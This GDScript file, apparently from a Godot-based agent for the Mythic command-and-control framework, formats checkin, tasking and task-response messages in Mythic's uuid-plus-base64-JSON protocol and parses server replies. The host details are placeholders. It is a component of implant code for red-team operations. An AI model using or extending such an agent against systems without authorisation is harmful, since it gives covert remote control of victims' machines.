extends Node

var checkin_done
var messages = {}

signal agent_response

func _ready():
	checkin_done = false

func _get_checkin_payload():
	# https:#docs.mythic-c2.net/customizing/c2-related-development/c2-profile-code/agent-side-coding/initial-checkin
	var uuid = $".".get_parent().get_node("config").get_payload_uuid()

	messages[uuid] = true

	var payload = {
		"action": "checkin", # required
		"ip": "127.0.0.1", # internal ip address - required
		"os": "Fedora 35", # os version - required
		"user": "its-a-feature", # username of current user - required
		"host": "spooky.local", # hostname of the computer - required
		"pid": 4444, # pid of the current process - required
		"uuid": uuid, #uuid of the payload - required
		"architecture": "x64", # platform arch - optional
		"domain": "test", # domain of the host - optional
		"integrity_level": 3, # integrity level of the process - optional
		"external_ip": "8.8.8.8", # external ip if known - optional
		"encryption_key": "", # encryption key - optional
		"decryption_key": "", # decryption key - optional
	}

	return Marshalls.utf8_to_base64(uuid + to_json(payload)).to_utf8()

func _get_tasking_payload():
	var uuid = $".".get_parent().get_node("config").get_callback_uuid()

	var payload = {
		"action": "get_tasking",
		"tasking_size": 1, # TODO: maths - calculate time between call and increase number by some amount?
		"delegates": [],
		"get_delegate_tasks": false,# no p2p for us at this time...
	}

	return Marshalls.utf8_to_base64(uuid + to_json(payload)).to_utf8()

func _create_task_response(status, completed, task_id, output, artifacts):
	var uuid = $".".get_parent().get_node("config").get_callback_uuid()

	var payload = {
		"action": "post_response",
		"responses": [],
	}
	
	var task_response = {
		"task_id": task_id,
		"user_output": output,
		"artifacts": [],
		"status": "error",
		"completed": completed
	}

	if status:
		task_response["status"] = "success"

	for artifact in artifacts:
		var entry = {}

		entry["base_artifact"] = artifact[0]
		entry["artifact"] = artifact[1]
		task_response["artifacts"].append(entry)

	payload["responses"].append(task_response) # TODO: create internal queue of task_response items and just return them all when agent checkin occures?

	print("returning payload from tasking: ", payload)
	print("ret payload uuid: ", uuid)

	return Marshalls.utf8_to_base64(uuid + to_json(payload)).to_utf8()

func unwrap_payload(packet):	
	var ret = {
		"action": "",
		"payload": "",
		"uuid": "",
		"status": false
	}

	var data = Marshalls.base64_to_utf8(packet)
	
	print("unwrap payload was: ", data)

	# 8e8354de-bfb4-47c8-8162-f11dbe68801d{"status":"success","decryption_key":"","encryption_key":"","id":"f7cccca6-ef2c-4113-a282-a327db0a769b","action":"checkin"}

	ret["uuid"] = data.substr(0, 36)

	# TODO: decryption
	ret["payload"] = parse_json(data.substr(36))

	if ret["payload"].has("action"):
		ret["action"] = ret["payload"].get("action")

	if ret["payload"].has("status"):
		ret["status"] = ret["payload"].get("status") == "success"

	print("unwrap return: ", ret)

	return ret

func agent_response(payload):

	if payload:
		emit_signal("agent_response", payload)
	else:
		print("agent response empty / false : ", payload)
